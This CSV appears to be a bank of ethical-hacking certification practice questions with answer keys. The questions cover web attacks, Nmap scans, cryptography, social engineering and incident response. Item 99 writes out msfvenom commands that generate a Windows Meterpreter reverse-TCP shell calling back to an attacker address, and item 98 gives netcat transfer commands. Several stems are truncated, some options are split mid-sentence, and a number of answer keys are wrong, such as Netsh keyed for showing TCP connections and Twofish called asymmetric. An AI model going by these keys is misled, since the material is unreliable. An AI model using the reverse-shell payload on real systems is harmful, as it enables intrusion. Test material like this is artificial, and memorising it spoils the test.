id,question,A,B,C,D,E,F,G,answer
36,"Scenario1: * 1. Victim opens the attacker's web site. * 2. Attacker sets up a web site which contains interesting and attractive content like 'Do you want to make $1000 in a day?'. * 3. Victim clicks to the interesting and attractive content URL. * 4. Attacker creates a transparent 'iframe' in front of the URL which victim attempts to click, so victim thinks that he/she clicks to the 'Do you want to make $1000 in a day?' URL but actually he/she clicks to the content or URL that exists in the transparent 'iframe' which is setup by the attacker. What is the name of the attack which is mentioned in the scenario?","Session Fixation","HTML Injection","HTTP Parameter Pollution","Clickjacking Attack","","","","D"
37,"Which type of security feature stops vehicles from crashing through the doors of a building?","Bollards","Receptionist","Mantrap","Turnstile","","","","A"
38,"When you are getting information about a web server, it is very important to know the HTTP Methods (GET, POST, HEAD, PUT, DELETE, TRACE) that are available because there are two critical methods (PUT and DELETE). PUT can upload a file to the server and DELETE can delete a file from the server. You can detect all these methods (GET, POST, HEAD, DELETE, PUT, TRACE) using NMAP script engine. What Nmap script will help you with this task?","http-methods","http enum","http-headers","http-git","","","","A"
39,"By using a smart card and pin, you are using a two-factor authentication that satisfies","Something you are and something you remember","Something you have and something you know","Something you know and something you are","Something you have and something you are","","","","B"
40,"What did the following commands determine?","That the Joe account has a SID of 500","These commands demonstrate that the guest account has NOT been disabled","These commands demonstrate that the guest account has been disabled","That the true administrator is Joe","Issued alone, these commands prove nothing","","","D"
41,"Null sessions are un-authenticated connections (not using a username or password.) to an NT or 2000 system. Which TCP and UDP ports must you filter to check null sessions on your network?","137 and 139","137 and 443","139 and 443","139 and 445","","","","D"
42,"Which of the following Linux commands will resolve a domain name into IP address?",">host-t a hackeddomain.com",">host-t ns hackeddomain.com",">host -t soa hackeddomain.com",">host -t AXFR hackeddomain.com","","","","A"
43,"What is the role of test automation in security testing?","It is an option but it tends to be very expensive.","It should be used exclusivel","Manual testing is outdated because of low speed and possible test setup inconsistencies.","Test automation is not usable in security due to the complexity of the tests.","It can accelerate benchmark tests and repeat them with a consistent test setu","But it cannot replace manual testing completely.","","D"
44,"An Intrusion Detection System (IDS) has alerted the network administrator to a possibly malicious sequence of packets sent to a Web server in the network??s external DMZ. The packet traffic was captured by the IDS and saved to a PCAP file. What type of network tool can be used to determine if these packets are genuinely malicious or simply a false positive?","Protocol analyzer","Network sniffer","Intrusion Prevention System (IPS)","Vulnerability scanner","","","","A"
45,"You are a penetration tester working to test the user awareness of the employees of the client xyz. You harvested two employees' emails from some public sources and are creating a client-side backdoor to send it to the employees via email. Which stage of the cyber kill chain are you at?","Reconnaissance","Command and control","Weaponization","Exploitation","","","","C"
46,"Jim, a professional hacker, targeted an organization that is operating critical Industrial Infrastructure. Jim used Nmap to scan open pons and running services on systems connected to the organization's OT network. He used an Nmap command to identify Ethernet/IP devices connected to the Internet and further gathered Information such as the vendor name, product code and name, device name, and IP address. Which of the following Nmap commands helped Jim retrieve the required information?","nmap -Pn -sT --scan-delay 1s --max-parallelism 1 -p < Port List > < Target IP >","nmap -Pn -sU -p 44818 --script enip-info < Target IP >","nmap -Pn -sT -p 46824 < Target IP >","nmap -Pn -sT -p 102 --script s7-info < Target IP >","","","","B"
47,"Steve, an attacker, created a fake profile on a social media website and sent a request to Stella. Stella was enthralled by Steve's profile picture and the description given for his profile, and she initiated a conversation with him soon after accepting the request. After a few days. Sieve started asking about her company details and eventually gathered all the essential information regarding her company. What is the social engineering technique Steve employed in the above scenario?","Diversion theft","Baiting","Honey trap","Piggybacking","","","","C"
48,"How is the public key distributed in an orderly, controlled fashion so that the users can be sure of the sender??s identity?","Hash value","Private key","Digital signature","Digital certificate","","","","D"
49,"Nedved is an IT Security Manager of a bank in his country. One day. he found out that there is a security breach to his company's email server based on analysis of a suspicious connection from the email server to an unknown IP Address. What is the first thing that Nedved needs to do before contacting the incident response team?","Leave it as it Is and contact the incident response te3m right away","Block the connection to the suspicious IP Address from the firewall","Disconnect the email server from the network","Migrate the connection to the backup email server","","","","C"
50,"s) which of the following protocols can be used to secure an LDAP service against anonymous queries?","SSO","RADIUS","WPA","NTLM","","","","D"
51,"Boney, a professional hacker, targets an organization for financial benefits. He performs an attack by sending his session ID using an MITM attack technique. Boney first obtains a valid session ID by logging into a service and later feeds the same session 10 to the target employee. The session ID links the target employee to Boneys account page without disclosing any information to the victim. When the target employee clicks on the link, all the sensitive payment details entered in a form are linked to Boneys account. What is the attack performed by Boney in the above scenario?","Session donation attack","Session fixation attack","Forbidden attack","CRIME attack","","","","A"
52,"Vlady works in a fishing company where the majority of the employees have very little understanding of IT let alone IT Security. Several information security issues that Vlady often found includes, employees sharing password, writing his/her password on a post it note and stick it to his/her desk, leaving the computer unlocked, didn??t log out from emails or other social media accounts, and etc. After discussing with his boss, Vlady decided to make some changes to improve the security environment in his company. The first thing that Vlady wanted to do is to make the employees understand the importance of keeping confidential information, such as password, a secret and they should not share it with other persons. Which of the following steps should be the first thing that Vlady should do to make the employees in his company understand to importance of keeping confidential information a secret?","Warning to those who write password on a post it note and put it on his/her desk","Developing a strict information security policy","Information security awareness training","Conducting a one to one discussion with the other employees about the importance of information security","","","","A"
53,"What is one of the advantages of using both symmetric and asymmetric cryptography in SSL/TLS?","Symmetric algorithms such as AES provide a failsafe when asymmetric methods fail.","Asymmetric cryptography is computationally expensive in compariso","However, it is well-suited to securely negotiate keys for use with symmetric cryptography.","Symmetric encryption allows the server to securely transmit the session keys out-of- band.","Supporting both types of algorithms allows less-powerful devices such as mobile phones to use symmetric encryption instead.","","","D"
54,"Ethical hacker jane Smith is attempting to perform an SQL injection attach. She wants to test the response time of a true or false response and wants to use a second command to determine whether the database will return true or false results for user IDs. which two SQL Injection types would give her the results she is looking for?","Out of band and boolean-based","Time-based and union-based","union-based and error-based","Time-based and boolean-based","","","","D"
55,"What kind of detection techniques is being used in antivirus softwares that identifies malware by collecting data from multiple protected systems and instead of analyzing files locally it's made on the premiers environment-","VCloud based","Honypot based","Behaviour based","Heuristics based","","","","A"
56,"Bella, a security professional working at an it firm, finds that a security breach has occurred while transferring important files. Sensitive data, employee usernames. and passwords are shared In plaintext, paving the way for hackers 10 perform successful session hijacking. To address this situation. Bella Implemented a protocol that sends data using encryption and digital certificates. Which of the following protocols Is used by Bella?","FTP","HTTPS","FTPS","IP","","","","C"
57,"is a tool that can hide processes from the process list, can hide files, registry entries, and intercept keystrokes.","Trojan","RootKit","DoS tool","Scanner","Backdoor","","","B"
58,"These hackers have limited or no training and know how to use only basic techniques or tools. What kind of hackers are we talking about?","Black-Hat Hackers A","Script Kiddies","White-Hat Hackers","Gray-Hat Hacker","","","","B"
59,"Sam is working as a system administrator In an organization. He captured the principal characteristics of a vulnerability and produced a numerical score to reflect Its severity using CVSS v3.0 to property assess and prioritize the organization's vulnerability management processes. The base score that Sam obtained after performing cvss rating was 4.0. What is the CVSS severity level of the vulnerability discovered by Sam in the above scenario?","Medium","Low","Critical","High","","","","A"
60,"John is an incident handler at a financial institution. His steps in a recent incident are not up to the standards of the company. John frequently forgets some steps and procedures while handling responses as they are very stressful to perform. Which of the following actions should John take to overcome this problem with the least administrative effort?","Create an incident checklist.","Select someone else to check the procedures.","Increase his technical skills.","Read the incident manual every time it occurs.","","","","C"
61,"What is the first step for a hacker conducting a DNS cache poisoning (DNS spoofing) attack against an organization?","The attacker queries a nameserver using the DNS resolver.","The attacker makes a request to the DNS resolver.","The attacker forges a reply from the DNS resolver.","The attacker uses TCP to poison the ONS resofver.","","","","B"
62,"Clark is a professional hacker. He created and configured multiple domains pointing to the same host to switch quickly between the domains and avoid detection. Identify the behavior of the adversary In the above scenario.","use of command-line interface","Data staging","Unspecified proxy activities","Use of DNS tunneling","","","","C"
63,"What type of analysis is performed when an attacker has partial knowledge of inner- workings of the application?","Black-box","Announced","White-box","Grey-box","","","","D"
64,"What would be the fastest way to perform content enumeration on a given web server by using the Gobuster tool?","Performing content enumeration using the bruteforce mode and 10 threads","Shipping SSL certificate verification","Performing content enumeration using a wordlist","Performing content enumeration using the bruteforce mode and random file extensions","","","","C"
65,"A friend of yours tells you that he downloaded and executed a file that was sent to him by a coworker. Since the file did nothing when executed, he asks you for help because he suspects that he may have installed a trojan on his computer. what tests would you perform to determine whether his computer Is Infected?","Use ExifTool and check for malicious content.","You do not check; rather, you immediately restore a previous snapshot of the operating system.","Upload the file to VirusTotal.","Use netstat and check for outgoing connections to strange IP addresses or domains.","","","","D"
66,"An organization is performing a vulnerability assessment tor mitigating threats. James, a pen tester, scanned the organization by building an inventory of the protocols found on the organization's machines to detect which ports are attached to services such as an email server, a web server or a database server. After identifying the services, he selected the vulnerabilities on each machine and started executing only the relevant tests. What is the type of vulnerability assessment solution that James employed in the above scenario?","Product-based solutions","Tree-based assessment","Service-based solutions","inference-based assessment","","","","D"
67,"Gavin owns a white-hat firm and is performing a website security audit for one of his clients. He begins by running a scan which looks for common misconfigurations and outdated software versions. Which of the following tools is he most likely using?","Nikto","Nmap","Metasploit","Armitage","","","","B"
68,"During the process of encryption and decryption, what keys are shared?","Private keys","User passwords","Public keys","Public and private keys","","","","C"
69,"Abel, a cloud architect, uses container technology to deploy applications/software including all its dependencies, such as libraries and configuration files, binaries, and other resources that run independently from other processes in the cloud environment. For the containerization of applications, he follows the five-tier container technology architecture. Currently. Abel is verifying and validating image contents, signing images, and sending them to the registries. Which of the following tiers of the container technology architecture Is Abel currently working in?","Tier-1: Developer machines","Tier-4: Orchestrators","Tier-3: Registries","Tier-2: Testing and accreditation systems","","","","D"
70,"Henry Is a cyber security specialist hired by BlackEye - Cyber security solutions. He was tasked with discovering the operating system (OS) of a host. He used the Unkornscan tool to discover the OS of the target system. As a result, he obtained a TTL value, which Indicates that the target system is running a Windows OS. Identify the TTL value Henry obtained, which indicates that the target OS is Windows.","64","128","255","138","","","","B"
71,"When a security analyst prepares for the formal security assessment - what of the following should be done in order to determine inconsistencies in the secure assets database and verify that system is compliant to the minimum security baseline?","Data items and vulnerability scanning","Interviewing employees and network engineers","Reviewing the firewalls configuration","Source code review","","","","A"
72,"which type of virus can change its own code and then cipher itself multiple times as it replicates?","Stealth virus","Tunneling virus","Cavity virus","Encryption virus","","","","A"
73,"Which of the following statements is FALSE with respect to Intrusion Detection Systems?","Intrusion Detection Systems can be configured to distinguish specific content in network packets","Intrusion Detection Systems can easily distinguish a malicious payload in an encrypted traffic","Intrusion Detection Systems require constant update of the signature library","Intrusion Detection Systems can examine the contents of the data n context of the network protocol","","","","B"
74,"Which of the following DoS tools is used to attack target web applications by starvation of available sessions on the web server? The tool keeps sessions at halt using never-ending POST transmissions and sending an arbitrarily large content-length header value.","My Doom","Astacheldraht","R-U-Dead-Yet?(RUDY)","LOIC","","","","C"
75,"Morris, a professional hacker, performed a vulnerability scan on a target organization by sniffing the traffic on the network lo identify the active systems, network services, applications, and vulnerabilities. He also obtained the list of the users who are currently accessing the network. What is the type of vulnerability assessment that Morris performed on the target organization?","internal assessment","Passive assessment","External assessment","Credentialed assessment","","","","B"
76,"Attacker Steve targeted an organization's network with the aim of redirecting the company's web traffic to another malicious website. To achieve this goal, Steve performed DNS cache poisoning by exploiting the vulnerabilities In the DNS server software and modified the original IP address of the target website to that of a fake website. What is the technique employed by Steve to gather information for identity theft?","Pretexting","Pharming","Wardriving","Skimming","","","","B"
77,"Gilbert, a web developer, uses a centralized web API to reduce complexity and increase the Integrity of updating and changing data. For this purpose, he uses a web service that uses HTTP methods such as PUT. POST. GET. and DELETE and can improve the overall performance, visibility, scalability, reliability, and portability of an application. What is the type of web-service API mentioned in the above scenario?","JSON-RPC","SOAP API","RESTful API","REST API","","","","C"
78,"This form of encryption algorithm is asymmetric key block cipher that is characterized by a 128-bit block size, and its key size can be up to 256 bits. Which among the following is this encryption algorithm?","Twofish encryption algorithm","HMAC encryption algorithm","IDEA","Blowfish encryption algorithm","","","","A"
79,"Which command can be used to show the current TCP/IP connections?","Netsh","Netstat","Net use connection","Net use","","","","A"
80,"Tremp is an IT Security Manager, and he is planning to deploy an IDS in his small company. He is looking for an IDS with the following characteristics: - Verifies success or failure of an attack - Monitors system activities Detects attacks that a network-based IDS fails to detect - Near real-time detection and response - Does not require additional hardware - Lower entry cost Which type of IDS is best suited for Tremp's requirements?","Gateway-based IDS","Network-based IDS","Host-based IDS","Open source-based","","","","C"
81,"Which of the following are well known password-cracking programs?","L0phtcrack","NetCat","Jack the Ripper","Netbus","John the Ripper","","","AE"
82,"What is the algorithm used by LM for Windows2000 SAM?","MD4","DES","SHA","SSL","","","","B"
83,"In Trojan terminology, what is a covert channel?","A channel that transfers information within a computer system or network in a way that violates the security policy","A legitimate communication path within a computer system or network for transfer of data","It is a kernel operation that hides boot processes and services to mask detection","It is Reverse tunneling technique that uses HTTPS protocol instead of HTTP protocol to establish connections","","","","A"
84,"Emily, an extrovert obsessed with social media, posts a large amount of private information, photographs, and location tags of recently visited places. Realizing this. James, a professional hacker, targets Emily and her acquaintances, conducts a location search to detect their geolocation by using an automated tool, and gathers information to perform other sophisticated attacks. What is the tool employed by James in the above scenario?","ophcrack","Hootsuite","VisualRoute","HULK","","","","B"
85,"s) for his company for over 15 years and has become very successful. One day, Yancey comes in to work and finds out that the company will be downsizing and he will be out of a job in two weeks. Yancey is very angry and decides to place logic bombs, viruses, Trojans, and backdoors all over the network to take down the company once he has left. Yancey does not care if his actions land him in jail for 30 or more years, he just wants the company to pay for what they are doing to him. What would Yancey be considered?","Yancey would be considered a Suicide Hacker","Since he does not care about going to jail, he would be considered a Black Hat","Because Yancey works for the company currently; he would be a White Hat","Yancey is a Hacktivist Hacker since he is standing up to a company that is downsizing","","","","A"
86,"What piece of hardware on a computer's motherboard generates encryption keys and only releases a part of the key so that decrypting a disk on a new piece of hardware is not possible?","CPU","GPU","UEFI","TPM","","","","D"
87,"An attacker redirects the victim to malicious websites by sending them a malicious link by email. The link appears authentic but redirects the victim to a malicious web page, which allows the attacker to steal the victim's data. What type of attack is this?","Phishing","Vlishing","Spoofing","DDoS","","","","A"
88,"Abel, a security professional, conducts penetration testing in his client organization to check for any security loopholes. He launched an attack on the DHCP servers by broadcasting forged DHCP requests and leased all the DHCP addresses available in the DHCP scope until the server could not issue any more IP addresses. This led to a Dos attack, and as a result, legitimate employees were unable to access the clients network. Which of the following attacks did Abel perform in the above scenario?","VLAN hopping","DHCP starvation","Rogue DHCP server attack","STP attack","","","","B"
89,"what is the port to block first in case you are suspicious that an loT device has been compromised?","22","443","48101","80","","","","C"
90,"While browsing his Facebook teed, Matt sees a picture one of his friends posted with the caption. ""Learn more about your friends!"", as well as a number of personal questions. Matt is suspicious and texts his friend, who confirms that he did indeed post it. With assurance that the post is legitimate. Matt responds to the questions on the post, a few days later. Mates bank account has been accessed, and the password has been changed. What most likely happened?","Matt inadvertently provided the answers to his security questions when responding to the post.","Matt's bank-account login information was brute forced.","Matt Inadvertently provided his password when responding to the post.","Matt's computer was infected with a keylogger.","","","","A"
91,"Techno Security Inc. recently hired John as a penetration tester. He was tasked with identifying open ports in the target network and determining whether the ports are online and any firewall rule sets are encountered. John decided to perform a TCP SYN ping scan on the target network. Which of the following Nmap commands must John use to perform the TCP SYN ping scan?","nmap -sn -pp < target ip address >","nmap -sn -PO < target IP address >","nmap -sn -PS < target IP address >","nmap -sn -PA < target IP address >","","","","C"
92,"While testing a web application in development, you notice that the web server does not properly ignore the ??dot dot slash?? (../) character string and instead returns the file listing of a folder structure of the server. What kind of attack is possible in this scenario?","Cross-site scripting","Denial of service","SQL injection","Directory traversal","","","","D"
93,"While examining audit logs, you discover that people are able to telnet into the SMTP server on port 25. You would like to block this, though you do not see any evidence of an attack or other wrong doing. However, you are concerned about affecting the normal functionality of the email server. From the following options choose how best you can achieve this objective?","Block port 25 at the firewall.","Shut off the SMTP service on the server.","Force all connections to use a username and password.","Switch from Windows Exchange to UNIX Sendmail.","None of the above.","","","E"
94,"Password cracking programs reverse the hashing process to recover passwords. (True/False.)","True","False","","","","","","B"
95,"s) or you may contact us at the following address: Media Internet Consultants, Edif. Neptuno, Planta Baja, Ave. Ricardo J. Alfaro, Tumba Muerto, n/a Panama How will you determine if this is Real Anti-Virus or Fake Anti-Virus website?","Look at the website design, if it looks professional then it is a Real Anti-Virus website","Connect to the site using SSL, if you are successful then the website is genuine","Search using the URL and Anti-Virus product name into Google and lookout for suspicious warnings against this site","Download and install Anti-Virus software from this suspicious looking site, your Windows 7 will prompt you and stop the installation if the downloaded file is a malware","Download and install Anti-Virus software from this suspicious looking site, your Windows 7 will prompt you and stop the installation if the downloaded file is a malware","","","C"
96,"During the enumeration phase. Lawrence performs banner grabbing to obtain information such as OS details and versions of services running. The service that he enumerated runs directly on TCP port 445. Which of the following services is enumerated by Lawrence in this scenario?","Server Message Block (SMB)","Network File System (NFS)","Remote procedure call (RPC)","Telnet","","","","A"
97,"Ethical backer jane Doe is attempting to crack the password of the head of the it department of ABC company. She Is utilizing a rainbow table and notices upon entering a password that extra characters are added to the password after submitting. What countermeasure is the company using to protect against rainbow tables?","Password key hashing","Password salting","Password hashing","Account lockout","","","","B"
98,"An attacker runs netcat tool to transfer a secret file between two hosts. He is worried about information being sniffed on the network. How would the attacker use netcat to encrypt the information before transmitting onto the wire?","Machine A: netcat -l -p -s password 1234 < testfileMachine B: netcat <machine A IP> 1234","Machine A: netcat -l -e magickey -p 1234 < testfileMachine B: netcat <machine A IP> 1234","Machine A: netcat -l -p 1234 < testfile -pw passwordMachine B: netcat <machine A IP> 1234 -pw password","Use cryptcat instead of netcat","","","","D"
99,"what is the correct way of using MSFvenom to generate a reverse TCP shellcode for windows?","msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.30 LPORT=4444 -f c","msfvenom -p windows/meterpreter/reverse_tcp RHOST=10.10.10.30 LPORT=4444 -f c","msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.30 LPORT=4444 -f exe > shell.exe","msfvenom -p windows/meterpreter/reverse_tcp RHOST=10.10.10.30 LPORT=4444 -f exe > shell.exe","","","","C"
100,"jane invites her friends Alice and John over for a LAN party. Alice and John access Jane's wireless network without a password. However. Jane has a long, complex password on her router. What attack has likely occurred?","Wireless sniffing","Piggybacking","Evil twin","Wardriving","","","","C"
101,"Fred is the network administrator for his company. Fred is testing an internal switch. From an external IP address, Fred wants to try and trick this switch into thinking it already has established a session with his computer. How can Fred accomplish this?","Fred can accomplish this by sending an IP packet with the RST/SIN bit and the source address of his computer.","He can send an IP packet with the SYN bit and the source address of his computer.","Fred can send an IP packet with the ACK bit set to zero and the source address of the switch.","Fred can send an IP packet to the switch with the ACK bit and the source address of his machine.","","","","D"
102,"Taylor, a security professional, uses a tool to monitor her company's website, analyze the website's traffic, and track the geographical location of the users visiting the company's website. Which of the following tools did Taylor employ in the above scenario?","WebSite Watcher","web-Stat","Webroot","WAFW00F","","","","B"
103,"An Internet Service Provider (ISP) has a need to authenticate users connecting via analog modems, Digital Subscriber Lines (DSL), wireless data services, and Virtual Private Networks (VPN) over a Frame Relay network. Which AAA protocol is the most likely able to handle this requirement?","TACACS+","DIAMETER","Kerberos","RADIUS","","","","D"
104,"In your cybersecurity class, you are learning about common security risks associated with web servers. One topic that comes up is the risk posed by using default server settings. Why is using default settings ona web - server considered a security risk, and what would be the best initial step to mitigate this risk?","Default settings cause server malfunctions; simplify the settings","Default settings allow unlimited login attempts; setup account lockout","Default settings reveal server software type; change these settings","Default settings enable auto-updates; disable and manually patch","","","","C"
105,"Attempting an injection attack on a web server based on responses to True/False QUESTION NO:s is called which of the following?","Compound SQLi","Blind SQLi","Classic SQLi","DMS-specific SQLi","","","","B"
